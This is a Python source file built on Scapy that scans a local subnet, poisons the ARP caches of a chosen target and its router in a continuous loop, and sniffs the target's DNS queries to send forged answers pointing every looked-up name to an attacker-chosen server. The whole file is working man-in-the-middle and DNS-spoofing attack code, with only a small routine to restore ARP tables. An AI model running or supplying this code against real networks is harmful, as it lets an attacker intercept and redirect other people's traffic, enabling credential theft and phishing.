from scapy.all import *
from subprocess import Popen, PIPE, call
import threading
import random
import argparse
import sys
import os
import platform
import time
import ipaddress
from multiprocessing import Process

g_target_ip = ""
g_router_ip = ""
g_server_ip = ""

def rtrv_interfaces():
    return get_if_list()

def scan_hosts_scapy(interface: str):
    host_ip = get_if_addr(interface)
    subnet_mask = "255.255.255.0"
    host_ip = host_ip + "/" + subnet_mask
    net = ipaddress.ip_network(host_ip, strict = False)
    host = []
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst = str(net)), timeout = 2, iface = interface, verbose = False) #default: 10.10.10.0/24

    for i in range(len(ans)):
        host.append((str(i) + ".", "IP: ", ans[i][1]["ARP"].psrc, "and MAC: ", ans[i][1]["ARP"].hwsrc))

    return host

def get_mac(ip):
    arp = Ether()/ARP(pdst=ip)
    resp = srp1(arp, verbose=0)
    return (resp[Ether].src)

def poison_arp_cache(arp_router_ip, arp_target_ip):
    router_mac = get_mac(arp_router_ip)
    target_mac = get_mac(arp_target_ip)
    while True:
        # Poison router's cache (Scapy will automatically fill in the ethernet frame with our MAC)
        send(ARP(op=2, psrc=arp_target_ip, pdst=arp_router_ip, hwdst=router_mac), verbose=0)

	# Poison target's cache
        send(ARP(op=2, psrc=arp_router_ip, pdst=arp_target_ip, hwdst=target_mac), verbose=0)

	# Sleep to prevent flooding
        time.sleep(2)

def restore_arp_table(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def dns_sniffer(router_ip, target_ip, server_ip):
	global g_target_ip, g_router_ip, g_server_ip
	g_target_ip = target_ip
	g_router_ip = router_ip
	g_server_ip = server_ip
	sniff(filter="udp and port 53 and host " + g_target_ip, prn=dns_spoofer)

def dns_spoofer(pkt):
	global g_target_ip, g_router_ip, g_server_ip
	print(g_target_ip, g_router_ip, g_server_ip)

	if (pkt[IP].src == g_target_ip and pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
		if (pkt.haslayer(IPv6)):
			ip_layer = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
		else:
			ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)

		dns_resp =  ip_layer/ \
				UDP(dport=pkt[UDP].sport,sport=53)/ \
				DNS(id=pkt[DNS].id, ancount=1, qr=1, ra=1, qd=(pkt.getlayer(DNS)).qd, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=g_server_ip, ttl = 10))

		send(dns_resp, verbose=0)